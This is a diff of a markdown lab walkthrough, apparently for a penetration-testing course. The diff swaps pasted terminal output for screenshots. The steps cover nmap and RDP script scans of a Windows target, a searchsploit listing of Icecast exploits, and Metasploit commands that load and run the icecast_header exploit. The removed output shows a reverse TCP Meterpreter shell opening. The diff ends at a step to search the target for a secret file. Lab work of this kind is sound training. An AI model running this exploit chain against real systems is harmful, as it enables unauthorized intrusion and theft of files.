@@ -60,48 +60,12 @@ You've been provided full access to the network and are getting ping responses f
 
       > Answer: nmap -sV 192.168.0.20
 	 
-root@kali:/usr/share/nmap/scripts# nmap -sV 192.168.0.20
-Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 12:55 PDT
-Nmap scan report for 192.168.0.20
-Host is up (0.024s latency).
-Not shown: 994 closed ports
-PORT     STATE SERVICE       VERSION
-25/tcp   open  smtp          SLmail smtpd 5.5.0.4433
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds?
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-8000/tcp open  http          Icecast streaming media server
-MAC Address: 00:15:5D:00:04:01 (Microsoft)
-Service Info: Host: MSEDGEWIN10; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
+![nmap services](/Screenshots/Nmap.PNG "nmap services")
 
 
-*nmap vulnerabilities script scan:
+*nmap vulnerabilities script scan: nmap --script rdp-ntlm-info.nse 192.168.0.20
 
-root@kali:/usr/share/nmap/scripts# nmap --script rdp-ntlm-info.nse 192.168.0.20
-Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-25 12:53 PDT
-Nmap scan report for 192.168.0.20
-Host is up (0.011s latency).
-Not shown: 994 closed ports
-PORT     STATE SERVICE
-25/tcp   open  smtp
-135/tcp  open  msrpc
-139/tcp  open  netbios-ssn
-445/tcp  open  microsoft-ds
-3389/tcp open  ms-wbt-server
-| rdp-ntlm-info:
-|   Target_Name: MSEDGEWIN10
-|   NetBIOS_Domain_Name: MSEDGEWIN10
-|   NetBIOS_Computer_Name: MSEDGEWIN10
-|   DNS_Domain_Name: MSEDGEWIN10
-|   DNS_Computer_Name: MSEDGEWIN10
-|   Product_Version: 10.0.17763
-|_  System_Time: 2022-04-25T19:53:55+00:00
-8000/tcp open  http-alt
-MAC Address: 00:15:5D:00:04:01 (Microsoft)
+![nmap scripts](/Screenshots/Nmap-script.PNG "nmap scripts")
  
 2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
  
@@ -109,48 +73,24 @@ MAC Address: 00:15:5D:00:04:01 (Microsoft)
   
      > Answer: searchsploit icecast
 	 
-	 root@kali:/usr/share/nmap/scripts# searchsploit icecast
-
-![searchsploit icecast](/Screenshots/Nmap.PNG "searchsploit icecast")
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
- Exploit Title                                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Icecast 1.1.x/1.3.x - Directory Traversal                                                                                                                  | multiple/remote/20972.txt
-Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                                                                                                    | multiple/dos/20973.txt
-Icecast 1.3.7/1.3.8 - 'print_client()' Format String                                                                                                       | windows/remote/20582.c
-Icecast 1.x - AVLLib Buffer Overflow                                                                                                                       | unix/remote/21363.c
-Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                                                                                          | windows/remote/568.c
-Icecast 2.0.1 (Win32) - Remote Code Execution (2)                                                                                                          | windows/remote/573.c
-Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)                                                                                                | windows_x86/remote/16763.rb
-Icecast 2.x - XSL Parser Multiple Vulnerabilities                                                                                                          | multiple/remote/25238.txt
-icecast server 1.3.12 - Directory Traversal Information Disclosure                                                                                         | linux/remote/21602.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-Papers: No Results
-
+![searchsploit icecast](/Screenshots/searchsploit-icecast.PNG "searchsploit icecast")
 
 3. Now that we know which exploits are available to us, let's start Metasploit:
  
    - Run the command that starts Metasploit:
     
      > Answer: msfdb init then msfconsole to access the console.
+
+![msfconsole start](/Screenshots/msfconsole1.PNG "msfconsole start")
  
- 
+
 4. Search for the Icecast module and load it for use.
  
    - Run the command to search for the Icecast module:
      
      > Answer: search Icecast and or search Icecast type:exploit
 
-msf5 > search Icecast
-
-Matching Modules
-================
-
-   #  Name                                 Disclosure Date  Rank   Check  Description
-   -  ----                                 ---------------  ----   -----  -----------
-   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
-
+![msfconsole search](/Screenshots/search-msf-icecast1.PNG "msfconsole search")
 
  
    - Run the command to use the Icecast module:
@@ -159,29 +99,7 @@ Matching Modules
 
      > Answer: use 0
 
-msf5 > use 0
-msf5 exploit(windows/http/icecast_header) >
- 
- 
-5. Set the `RHOST` to the target machine.
- 
-   - Run the command that sets the `RHOST`:
-      
-     > Answer: set RHOSTS 192.168.0.20
-RHOSTS => 192.168.0.20
-
- 
-6. Run the Icecast exploit.
- 
-   - Run the command that runs the Icecast exploit.
-      
-     > Answer: msf5 exploit(windows/http/icecast_header) > run
-
-[*] Started reverse TCP handler on 192.168.0.8:4444
-[*] Sending stage (180291 bytes) to 192.168.0.20
-[*] Meterpreter session 1 opened (192.168.0.8:4444 -> 192.168.0.20:49731) at 2022-04-19 18:24:41 -0700
-
-meterpreter >
+![msfconsole use](/Screenshots/msfconsole-use.PNG "msfconsole use")
 
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
